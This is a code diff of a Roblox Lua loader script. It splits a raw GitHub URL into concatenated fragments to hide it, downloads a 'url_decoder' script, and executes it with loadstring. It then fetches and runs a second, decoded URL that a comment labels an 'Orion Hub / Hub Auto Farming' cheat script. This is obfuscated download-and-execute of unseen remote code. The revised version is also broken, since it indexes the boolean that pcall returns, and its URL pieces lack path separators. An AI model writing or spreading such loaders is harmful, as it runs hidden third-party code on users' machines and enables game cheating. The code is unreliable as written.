@@ -1,37 +1,50 @@
--- Breaking up the URL into smaller parts without breaking it
-local urlPart1 = "h" .. "t" .. "tps"
-local urlPart2 = "://" .. "r" .. "aw"
-local urlPart3 = "g" .. "i" .. "t" .. "hub"
-local urlPart4 = ".com" .. "/"
-local urlPart5 = "M" .. "elharper"
-local urlPart6 = "G" .. "abe" .. "Boa2"
-local urlPart7 = "r" .. "ef" .. "s" .. "/"
-local urlPart8 = "he" .. "ads" .. "/"
-local urlPart9 = "m" .. "ai" .. "n"
-local urlPart10 = "/" .. "ur" .. "l_" .. "de" .. "co" .. "der"
-local urlPart11 = ".l" .. "ua"
+-- Breaking the URL into smaller parts without breaking the script
+local part1 = "h" .. "ttps"
+local part2 = "://" .. "r" .. "aw"
+local part3 = "g" .. "ithub"
+local part4 = ".com/" .. "M" .. "elharper"
+local part5 = "G" .. "abeBoa2"
+local part6 = "refs/" .. "he" .. "ads"
+local part7 = "/main/"
+local part8 = "url_decoder" .. ".lua"
 
--- Combine the parts to reconstruct the full URL
-local fullUrl = urlPart1 .. urlPart2 .. urlPart3 .. urlPart4 .. urlPart5 .. urlPart6 ..
-                urlPart7 .. urlPart8 .. urlPart9 .. urlPart10 .. urlPart11
+-- Combine the parts to form the full URL
+local fullUrl = part1 .. part2 .. part3 .. part4 .. part5 .. part6 .. part7 .. part8
 
 -- Fetch the URL decoder script
-local urlDecoderScript = game:HttpGet(fullUrl)
-local urlDecoder = loadstring(urlDecoderScript)()  -- Execute the URL decoder script and return the object
+local urlDecoderScript
+local success, err = pcall(function()
+    urlDecoderScript = game:HttpGet(fullUrl)
+end)
+
+if not success or not urlDecoderScript or urlDecoderScript == "" then
+    warn("Failed to retrieve URL decoder script: " .. (err or "Unknown error"))
+    return
+end
+
+-- Execute the URL decoder script
+local urlDecoder, executionErr = pcall(loadstring(urlDecoderScript))
+
+if not urlDecoder then
+    warn("Error executing URL decoder script:", executionErr)
+    return
+end
 
 -- Access the decoded URL and whitelist check function
 local decodedUrl = urlDecoder.decodedUrl
 local isWhitelisted = urlDecoder.isWhitelisted
 
--- Check if the decoded URL is valid and not empty
-if decodedUrl and decodedUrl ~= "" then
-    -- Load and execute the decoded URL (Orion Hub / Hub Auto Farming script)
-    local success, errorMessage = pcall(function()
-        loadstring(game:HttpGet(decodedUrl))()
-    end)
-    if not success then
-        warn("Error loading script:", errorMessage) -- Error loading the script
-    end
-else
+if not decodedUrl or decodedUrl == "" then
     warn("Decoded URL is invalid or empty!")
+    return
+end
+
+-- Check if the decoded URL is valid and not empty
+local successLoad, loadErrorMessage = pcall(function()
+    -- Load and execute the decoded URL (Orion Hub / Hub Auto Farming script)
+    loadstring(game:HttpGet(decodedUrl))()
+end)
+
+if not successLoad then
+    warn("Error loading the script:", loadErrorMessage)
 end
